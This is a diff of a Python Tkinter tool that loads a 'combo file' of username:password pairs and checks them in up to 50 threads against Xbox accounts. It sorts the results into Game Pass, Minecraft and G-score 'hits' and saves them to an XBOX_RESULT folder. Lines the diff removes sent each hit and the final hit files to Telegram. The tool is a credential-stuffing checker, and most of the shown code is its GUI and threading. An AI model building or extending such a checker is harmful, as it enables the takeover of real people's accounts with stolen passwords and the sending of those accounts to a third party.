@@ -505,11 +505,9 @@ def save_hit_immediately(account_type, content, gscore):
             return
         
         filepath = os.path.join("XBOX_RESULT", filename)
-        
         existing = load_existing_accounts(filename)
         new_account = {'content': content, 'gscore': gscore}
         existing.append(new_account)
-        
         save_accounts_to_file(existing, filepath)
 
 # =================== GUI APPLICATION ===================
@@ -547,8 +545,8 @@ class App:
         tk.Label(r1, text="📁  Combo File:", bg="#12121f", fg="#00d4ff",
                 font=('Consolas', 11, 'bold')).pack(side=tk.LEFT)
         self.file_entry = tk.Entry(r1, width=50, font=('Consolas', 10),
-                                  bg="#0a0a0f", fg="#ffffff", insertbackground="#00ff88",
-                                  relief=tk.FLAT, bd=6, highlightbackground="#1e1e2e", highlightthickness=1)
+                                   bg="#0a0a0f", fg="#ffffff", insertbackground="#00ff88",
+                                   relief=tk.FLAT, bd=6, highlightbackground="#1e1e2e", highlightthickness=1)
         self.file_entry.pack(side=tk.LEFT, padx=8, fill=tk.X, expand=True)
         tk.Button(r1, text="Browse", command=self.browse,
                   bg="#00d4ff", fg="#000000", font=('Consolas', 9, 'bold'),
@@ -560,8 +558,8 @@ class App:
                 font=('Consolas', 11, 'bold')).pack(side=tk.LEFT)
         self.thr_var = tk.StringVar(value="35")
         tk.Spinbox(r2, from_=1, to=50, textvariable=self.thr_var, width=8,
-                   font=('Consolas', 10), bg="#0a0a0f", fg="#ffffff",
-                   relief=tk.FLAT, buttonbackground="#00d4ff").pack(side=tk.LEFT, padx=8)
+                  font=('Consolas', 10), bg="#0a0a0f", fg="#ffffff",
+                  relief=tk.FLAT, buttonbackground="#00d4ff").pack(side=tk.LEFT, padx=8)
 
         bf = tk.Frame(r2, bg="#12121f")
         bf.pack(side=tk.RIGHT)
@@ -616,8 +614,8 @@ class App:
         sb.config(command=self.logs.yview)
 
         self.status = tk.Label(mf, text="Ready", bd=1, relief=tk.SUNKEN,
-                                anchor=tk.W, bg="#12121f", fg="#00ff88",
-                                font=('Consolas', 9))
+                              anchor=tk.W, bg="#12121f", fg="#00ff88",
+                              font=('Consolas', 9))
         self.status.pack(fill=tk.X, pady=(8, 0))
 
     def stat_label(self, parent, title, val, r, c, color):
@@ -626,7 +624,7 @@ class App:
         tk.Label(f, text=title, bg="#0a0a0f", fg="#666666",
                 font=('Consolas', 10)).pack(side=tk.LEFT)
         lbl = tk.Label(f, text=val, bg="#0a0a0f", fg=color,
-                      font=('Consolas', 11, 'bold'))
+                       font=('Consolas', 11, 'bold'))
         lbl.pack(side=tk.LEFT, padx=(8, 0))
         return lbl
 
@@ -677,39 +675,21 @@ class App:
 
     def update_loop(self):
         self.update_stats()
-        
         try:
             while True:
                 msg = self.q.get_nowait()
                 t = msg.get('type')
-                if t == 'gamepass':
-                    self.log(f"🔥 GAME PASS HIT: {msg['combo'].split(':')[0]}", "gamepass")
-                    threading.Thread(target=send_telegram_hit, args=(msg['content'],), daemon=True).start()
-                elif t == 'minecraft':
-                    self.log(f"⛏️ MINECRAFT HIT: {msg['combo'].split(':')[0]}", "minecraft")
-                    threading.Thread(target=send_telegram_hit, args=(msg['content'],), daemon=True).start()
-                elif t == 'gscore':
-                    self.log(f"🏆 G-SCORE HIT: {msg['combo'].split(':')[0]}", "gscore")
-                    threading.Thread(target=send_telegram_hit, args=(msg['content'],), daemon=True).start()
-                elif t == 'bad':
-                    self.log(f"❌ BAD: {msg['combo'].split(':')[0]}", "bad")
-                elif t == 'twofa':
-                    self.log(f"🔒 2FA: {msg['combo'].split(':')[0]}", "twofa")
-                elif t == 'error':
-                    self.log(f"⚠️ ERROR: {msg['combo'].split(':')[0]}", "error")
-                elif t == 'done':
+                if t == 'done':
                     self.finished()
                 elif t == 'log':
                     self.log(msg.get('text', ''), msg.get('tag', 'info'))
         except queue.Empty:
             pass
-        
         self.root.after(50, self.update_loop)
 
     def start(self):
         global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count
         global total_combos, start_time, is_running, account_counter
-        global gamepass_accounts, minecraft_accounts, gscore_accounts
 
         fp = self.file_entry.get().strip()
         if not fp or not os.path.exists(fp):
@@ -719,22 +699,20 @@ class App:
             thr = int(self.thr_var.get())
             if not (1 <= thr <= 50):
                 raise ValueError
-        except ValueError:
-            messagebox.showerror("Error", "Threads must be between 1 and 50!")
+        except:
+            messagebox.showerror("Error", "Threads must be 1-50!")
             return
-
-        setup_folders()
 
         try:
             with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                 self.combos = [line.strip() for line in f if line.strip() and ':' in line]
         except Exception as e:
-            messagebox.showerror("Error", f"Failed to read combo file: {e}")
+            messagebox.showerror("Error", f"Failed to read file: {e}")
             return
 
         total_combos = len(self.combos)
         if total_combos == 0:
-            messagebox.showerror("Error", "The selected file contains no valid combos!")
+            messagebox.showerror("Error", "The combo file is empty or invalid!")
             return
 
         checked = 0
@@ -746,65 +724,38 @@ class App:
         minecraft_count = 0
         gscore_count = 0
         account_counter = 0
-        gamepass_accounts = []
-        minecraft_accounts = []
-        gscore_accounts = []
-
         start_time = time.time()
         is_running = True
+
+        setup_folders()
 
         self.btn_start.config(state=tk.DISABLED)
         self.btn_stop.config(state=tk.NORMAL)
         self.status.config(text="Checking in progress...")
 
-        self.log(f"Started checking {total_combos} combos with {thr} threads.", "info")
-
         threading.Thread(target=self.run_checker, args=(thr,), daemon=True).start()
 
-    def run_checker(self, thr):
+    def run_checker(self, threads):
         global is_running
-        with concurrent.futures.ThreadPoolExecutor(max_workers=thr) as executor:
-            self.executor = executor
-            futures = {executor.submit(check_account, combo): combo for combo in self.combos}
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(check_account, combo) for combo in self.combos]
             for future in concurrent.futures.as_completed(futures):
                 if not is_running:
                     break
-        
         self.q.put({'type': 'done'})
 
     def stop(self):
         global is_running
         is_running = False
         self.status.config(text="Stopping...")
-        self.log("Stopping checker...", "error")
 
     def finished(self):
-        global is_running, gamepass_accounts, minecraft_accounts, gscore_accounts
+        global is_running
         is_running = False
         self.btn_start.config(state=tk.NORMAL)
         self.btn_stop.config(state=tk.DISABLED)
-        self.status.config(text="Finished")
-        self.log("Checking finished!", "info")
-
-        # Save final sorted lists and send results
-        setup_folders()
-        
-        gp_file = os.path.join("XBOX_RESULT", "XBOX-GamePass.txt")
-        mc_file = os.path.join("XBOX_RESULT", "Minecraft-Hits.txt")
-        gs_file = os.path.join("XBOX_RESULT", "G-Score-Hits.txt")
-
-        gp_saved = save_accounts_to_file(load_existing_accounts("XBOX-GamePass.txt"), gp_file)
-        mc_saved = save_accounts_to_file(load_existing_accounts("Minecraft-Hits.txt"), mc_file)
-        gs_saved = save_accounts_to_file(load_existing_accounts("G-Score-Hits.txt"), gs_file)
-
-        if gp_saved > 0:
-            send_telegram_file(gp_file, f"🔥 *XBOX GAME PASS HITS* ({gp_saved} accounts)")
-        if mc_saved > 0:
-            send_telegram_file(mc_file, f"⛏️ *MINECRAFT HITS* ({mc_saved} accounts)")
-        if gs_saved > 0:
-            send_telegram_file(gs_file, f"🏆 *G-SCORE HITS* ({gs_saved} accounts)")
-
-        messagebox.showinfo("Done", "Checking process completed successfully! Results saved in XBOX_RESULT folder.")
+        self.status.config(text="Finished checking!")
+        messagebox.showinfo("Done", "Checking process has completed successfully!")
 
 if __name__ == "__main__":
     root = tk.Tk()
